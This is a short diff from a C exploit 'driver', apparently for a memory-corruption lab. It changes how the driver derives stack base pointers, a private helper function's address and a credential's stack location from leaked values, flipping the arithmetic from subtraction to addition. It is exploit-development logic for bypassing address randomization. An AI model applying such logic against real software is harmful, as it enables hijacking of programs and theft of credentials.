@@ -37,9 +37,9 @@ int main(int argc, char* argv[]) {
 	fprintf(stderr, "driver: Extracted cur_main_return_addr=%lx\n", cur_main_return_addr);
 
 	// Now, compute the information for the current run using the probed values
-	uint64_t cur_g_bp			= cur_main_bp - g_main_bp_dist;
-	uint64_t cur_auth_bp		= cur_main_bp - auth_main_bp_dist;
-	uint64_t cur_phelper_addr	= cur_main_return_addr - private_helper_distance;
+	uint64_t cur_g_bp			= cur_main_bp + g_main_bp_dist;
+	uint64_t cur_auth_bp		= cur_main_bp + auth_main_bp_dist;
+	uint64_t cur_phelper_addr	= cur_main_return_addr + private_helper_distance2;
 	uint64_t cur_cred			= cur_auth_bp - auth_bp_cred_dist;
 
 	fprintf(stderr, "driver: Computed cur_g_bp=%lx\n", cur_g_bp);
